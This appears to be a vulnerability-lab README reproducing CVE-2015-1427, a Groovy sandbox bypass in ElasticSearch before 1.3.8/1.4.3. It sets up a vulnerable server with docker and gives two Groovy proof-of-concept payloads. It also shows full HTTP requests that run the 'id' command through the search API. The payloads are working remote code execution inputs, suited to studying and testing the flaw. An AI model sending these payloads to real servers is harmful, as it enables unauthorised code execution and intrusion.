# ElasticSearch Groovy Sandbox Bypass and Remote Code Execution (CVE-2015-1427)

[中文版本(Chinese version)](README.zh-cn.md)

ElasticSearch is a distributed, RESTful search and analytics engine.

ElasticSearch versions prior to 1.3.8 and 1.4.3 contain a vulnerability in the Groovy scripting engine that allows attackers to bypass the sandbox protection and execute arbitrary code on the server.

After [CVE-2014-3120](../CVE-2014-3120/), ElasticSearch changed its default dynamic scripting language to Groovy and added a sandbox. However, dynamic language execution remained enabled by default. This vulnerability involves:

1. A sandbox bypass
2. A Groovy code execution vulnerability

ElasticSearch supports using "sandboxed" Groovy language as a dynamic scripting engine. However, the sandbox implementation was insufficient. Two methods for command execution were discovered:

1. Lupin's method: Bypass the Java sandbox using reflection
2. Tang3's method: Use Groovy language features to execute commands directly, without using Java

Based on these approaches, we have two different POCs.

Java sandbox bypass method:

```groovy
java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("id").getText()
```

Groovy direct command execution method:

```groovy
def command='id';def res=command.execute().text;res
```

References:

- <http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/>
- <https://github.com/XiphosResearch/exploits>
- <http://cb.drops.wiki/drops/papers-5107.html>
- <http://cb.drops.wiki/drops/papers-5142.html>

## Environment Setup

Execute the following commands to start a 1.4.2 version ElasticSearch server:

```
docker compose up -d
```

After the server starts, you can access the ElasticSearch server at `http://your-ip:9200`.

## Vulnerability Reproduction

Since querying requires at least one document in the index, first send the following request to add data:

```
POST /website/blog/ HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

{
  "name": "test"
}
```

Then send a request containing the payload to execute arbitrary commands:

```
POST /_search?pretty HTTP/1.1
Host: your-ip:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 156

{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

The command execution result will be returned in the response:

![](1.png)
